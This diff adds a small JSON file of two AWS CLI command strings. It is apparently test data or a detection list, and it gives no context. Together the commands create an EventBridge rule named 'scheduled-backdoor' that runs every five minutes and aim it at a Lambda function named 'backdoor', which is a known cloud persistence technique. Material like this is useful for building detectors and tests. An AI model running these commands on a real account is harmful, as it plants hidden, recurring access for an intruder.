@@ -1,0 +1,4 @@
+[
+  "aws events put-rule --name scheduled-backdoor --schedule-expression 'rate(5 minutes)' --state ENABLED",
+  "aws events put-targets --rule scheduled-backdoor --targets Id=1,Arn=arn:aws:lambda:REGION:ACCOUNT:function:backdoor"
+]
